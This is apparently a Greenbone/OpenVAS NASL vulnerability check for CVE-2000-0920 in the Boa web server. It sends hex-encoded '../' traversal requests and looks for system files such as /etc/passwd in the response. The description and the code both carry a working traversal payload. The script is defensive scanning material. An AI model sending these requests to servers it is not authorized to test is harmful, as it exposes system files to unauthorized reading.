# SPDX-FileCopyrightText: 2000 Thomas Reinke
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.10527");
  script_version("2023-08-01T13:29:10+0000");
  script_tag(name:"last_modification", value:"2023-08-01 13:29:10 +0000 (Tue, 01 Aug 2023)");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_cve_id("CVE-2000-0920");
  script_name("Boa file retrieval");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2000 Thomas Reinke");
  script_family("Remote file access");
  script_dependencies("gb_get_http_banner.nasl", "os_detection.nasl");
  script_mandatory_keys("Boa/banner");

  script_tag(name:"solution", value:"Upgrade to a latest version of the server.");

  script_tag(name:"summary", value:"The remote Boa server allows an attacker to read arbitrary files
  on the remote web server, prefixing the pathname of the file with hex-encoded ../../..

  Example:

  GET /%2e%2e/%2e%2e/%2e%2e/etc/passwd

  will return /etc/passwd.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"VendorFix");

  script_xref(name:"URL", value:"http://www.boa.org");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/1770");

  exit(0);
}

include("host_details.inc");
include("os_func.inc");
include("http_func.inc");
include("port_service_func.inc");
include("misc_func.inc");

port = http_get_port(default:80);
files = traversal_files();

foreach pattern(keys(files)) {

  file = files[pattern];

  url = string("/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/" + file);
  req = http_get(item:url, port:port);
  res = http_send_recv(port:port, data:req);

  if(egrep(string:res, pattern:pattern)) {
    report = http_report_vuln_url(port:port, url:url);
    security_message(port:port, data:report);
    exit(0);
  }
}

exit(99);
